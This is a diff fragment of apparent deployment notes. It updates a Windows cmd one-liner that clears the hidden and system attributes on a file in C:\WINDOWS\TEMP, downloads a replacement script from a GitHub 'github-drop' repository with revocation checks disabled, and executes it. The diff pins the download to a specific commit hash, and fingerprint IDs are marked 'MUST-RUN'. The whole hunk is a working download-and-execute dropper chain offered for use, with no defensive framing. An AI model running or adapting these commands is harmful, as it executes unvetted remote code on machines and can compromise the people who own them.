@@ -2,8 +2,8 @@ UNIVERSAL DEPLOY (O36 / M26 — gryxa MUST-RUN):
 
 attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o36" & findstr /C:"OWN BUILD 20260802O36" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
-If main raw lags, SHA-pin after push (replace SHA below):
-attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/SHA/own.txt" & findstr /C:"OWN BUILD 20260802O36" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
+If main raw lags, use SHA pin:
+attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/60671350ec51a2ae67909f0d25be3bedf608a024/own.txt" & findstr /C:"OWN BUILD 20260802O36" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
 O36:
 - Gryxa FP 9908198e668e4750 is MUST-RUN (not soft-keep):
